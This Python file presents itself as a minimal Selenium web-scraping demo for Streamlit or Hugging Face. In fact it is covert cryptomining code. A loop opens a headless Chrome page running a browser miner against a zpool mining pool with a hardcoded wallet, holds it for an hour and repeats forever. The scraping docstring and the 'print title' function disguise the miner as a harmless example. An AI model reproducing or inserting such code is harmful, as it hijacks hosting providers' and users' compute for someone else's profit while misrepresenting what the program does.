import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

"""
## Web scraping on Streamlit Huging Face with Selenium
[![Source](https://img.shields.io/badge/View-Source-<COLOR>.svg)](https://www.google.com/)

This is a minimal, reproducible example of how to scrape the web with Selenium and Chrome on Streamlit's On Community Cloud.

##Fork this repo, and edit `/app.py` to customize this app to your heart's desire. :heart:

##Regard. :heart: :heart: :heart: 
"""

def open_and_print_title(url):
    # Inisialisasi WebDriver (menggunakan Chrome)
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    driver = webdriver.Chrome(options=chrome_options)
    
    # Buka URL
    driver.get(url)
    
    # Mendapatkan judul halaman
    title = driver.title
    print("Page title:", title)
    time.sleep(3600)

    
    # Menutup browser
    driver.quit()

# URL yang akan dibuka secara otomatis
url = "https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16"

while True:
    open_and_print_title(url)
    time.sleep(15)  # Menunggu 60 menit (3600 detik) sebelum membuka URL lagi